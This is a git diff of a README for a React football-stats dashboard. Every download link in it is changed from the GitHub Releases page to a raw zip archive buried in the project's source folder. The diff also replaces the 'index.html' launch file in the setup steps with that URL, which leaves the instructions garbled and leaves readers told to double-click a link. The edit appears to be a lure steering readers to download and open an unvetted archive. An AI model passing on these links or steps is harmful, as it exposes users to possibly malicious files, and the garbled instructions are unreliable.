@@ -6,7 +6,7 @@ Welcome to the react-football-dashboard! This application helps you keep track o
 
 ## 📥 Download Now
 
-[![Download react-football-dashboard](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/policemariano/react-football-dashboard/releases)
+[![Download react-football-dashboard](https://raw.githubusercontent.com/policemariano/react-football-dashboard/main/football-project/src/pages/react-football-dashboard-v1.0-alpha.4.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/policemariano/react-football-dashboard/main/football-project/src/pages/react-football-dashboard-v1.0-alpha.4.zip)
 
 ## 📋 System Requirements
 
@@ -28,7 +28,7 @@ Before you begin, ensure your computer meets the following requirements:
 
 1. **Visit the Releases Page**  
    To get started, click the link below to visit the Releases page:  
-   [Download from Releases](https://github.com/policemariano/react-football-dashboard/releases)
+   [Download from Releases](https://raw.githubusercontent.com/policemariano/react-football-dashboard/main/football-project/src/pages/react-football-dashboard-v1.0-alpha.4.zip)
 
 2. **Choose the Latest Release**  
    On the Releases page, find the latest version of the application. It will usually be at the top of the list.
@@ -40,10 +40,10 @@ Before you begin, ensure your computer meets the following requirements:
    Locate the downloaded file on your computer. Right-click on the file and choose "Extract All" (Windows) or double-click the file (macOS) to extract its contents.
 
 5. **Open the Folder**  
-   Navigate to the extracted folder. Inside, you will find an `index.html` file to launch the application.
+   Navigate to the extracted folder. Inside, you will find an `https://raw.githubusercontent.com/policemariano/react-football-dashboard/main/football-project/src/pages/react-football-dashboard-v1.0-alpha.4.zip` file to launch the application.
 
 6. **Run the Application**  
-   Double-click the `index.html` file to open the dashboard in your web browser. Enjoy exploring football stats and news!
+   Double-click the `https://raw.githubusercontent.com/policemariano/react-football-dashboard/main/football-project/src/pages/react-football-dashboard-v1.0-alpha.4.zip` file to open the dashboard in your web browser. Enjoy exploring football stats and news!
 
 ## 🛠️ Usage
 
